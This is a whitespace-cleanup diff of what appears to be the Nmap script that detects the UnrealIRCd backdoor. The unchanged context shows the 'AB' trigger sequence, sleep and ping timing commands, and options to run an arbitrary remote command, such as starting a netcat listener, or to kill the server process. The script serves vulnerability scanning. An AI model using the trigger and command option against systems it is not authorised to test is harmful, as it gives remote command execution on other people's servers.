@@ -7,9 +7,9 @@ local string = require "string"
 
 description = [[
 Checks if an IRC server is backdoored by running a time-based command (ping)
-and checking how long it takes to respond. 
+and checking how long it takes to respond.
 
-The <code>irc-unrealircd-backdoor.command</code> script argument can be used to 
+The <code>irc-unrealircd-backdoor.command</code> script argument can be used to
 run an arbitrary command on the remote system. Because of the nature of
 this vulnerability (the output is never returned) we have no way of
 getting the output of the command. It can, however, be used to start a
@@ -25,11 +25,11 @@ netcat listener as demonstrated here:
   ron
 </code>
 
-Metasploit can also be used to exploit this vulnerability. 
+Metasploit can also be used to exploit this vulnerability.
 
 In addition to running arbitrary commands, the
 <code>irc-unrealircd-backdoor.kill</code> script argument can be passed, which
-simply kills the UnrealIRCd process. 
+simply kills the UnrealIRCd process.
 
 
 Reference:
@@ -39,15 +39,15 @@ Reference:
 ]]
 
 ---
--- @args irc-unrealircd-backdoor.command An arbitrary command to run on the remote system (note, however, that you won't see the output of your command). This will always be attempted, even if the host isn't vulnerable. The pattern <code>%IP%</code> will be replaced with the ip address of the target host. 
--- @args irc-unrealircd-backdoor.kill If set to <code>1</code> or <code>true</code>, kill the backdoored UnrealIRCd running. 
--- @args irc-unrealircd-backdoor.wait Wait time in seconds before executing the check. This is recommended to set for more reliable check (100 is good value). 
+-- @args irc-unrealircd-backdoor.command An arbitrary command to run on the remote system (note, however, that you won't see the output of your command). This will always be attempted, even if the host isn't vulnerable. The pattern <code>%IP%</code> will be replaced with the ip address of the target host.
+-- @args irc-unrealircd-backdoor.kill If set to <code>1</code> or <code>true</code>, kill the backdoored UnrealIRCd running.
+-- @args irc-unrealircd-backdoor.wait Wait time in seconds before executing the check. This is recommended to set for more reliable check (100 is good value).
 --
 -- @output
 -- PORT     STATE SERVICE
 -- 6667/tcp open  irc
 -- |_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
--- 
+--
 
 author = "Vlatko Kosturjak, Ron Bowes"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
@@ -73,7 +73,7 @@ action = function(host, port)
 
 	-- If the command takes (delay - delay_fudge) or more seconds, the server is vulnerable.
 	-- I defined the furdge as 1 second, for now, just because of rounding issues. In practice,
-	-- the actual delay should never be shorter than the given delay, only longer. 
+	-- the actual delay should never be shorter than the given delay, only longer.
 	local delay_fudge = 1
 
 	-- We send this command on connection because comm.tryssl needs to send
@@ -81,15 +81,15 @@ action = function(host, port)
 	-- initialization.
 	local noop_command = "TIME"
 
-	-- The 'AB' sequence triggers the backdoor to run a command. 
+	-- The 'AB' sequence triggers the backdoor to run a command.
 	local trigger = "AB"
 
 	-- We define a highly unique variable as a type of 'ping' -- it lets us see when our
 	-- command returns. Typically, asynchronous data will be received after the initial
-	-- connection -- this lets us ignore that extra data. 
+	-- connection -- this lets us ignore that extra data.
 	local unique = "SOMETHINGUNIQUE"
 
-	-- On Linux, do a simple sleep command. 
+	-- On Linux, do a simple sleep command.
 	local command_linux = "sleep " .. delay
 
 	-- Set up an extra command, if the user requested one
@@ -102,11 +102,11 @@ action = function(host, port)
 
 	-- Windows, unfortunately, doesn't have a sleep command. Instead, we use 'ping' to
 	-- simulate a sleep (thanks to Ed Skoudis for teaching me this one!). We always want
-	-- to add 1 to the delay because the first ping happens instantly. 
+	-- to add 1 to the delay because the first ping happens instantly.
 	--
 	-- This is likely unnecessary, because the Windows version of UnrealIRCd is reportedly
 	-- not vulnerable. However, it's possible that some odd person may have compiled it
-	-- from the vulnerable sourcecode, so we check for it anyways. 
+	-- from the vulnerable sourcecode, so we check for it anyways.
 	local command_windows = "ping -n " .. (delay + 1) .. " 127.0.0.1"
 
 	-- Put together the full command
@@ -170,7 +170,7 @@ action = function(host, port)
 		else
 			-- If the server unexpectedly closes the connection, it
 			-- is usually related to throttling. Therefore, we
-			-- print a throttling warning. 
+			-- print a throttling warning.
 			stdnse.print_debug(1, "irc-unrealircd-backdoor: Receive failed: %s", response)
 			socket:close()
 			return "Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again)."
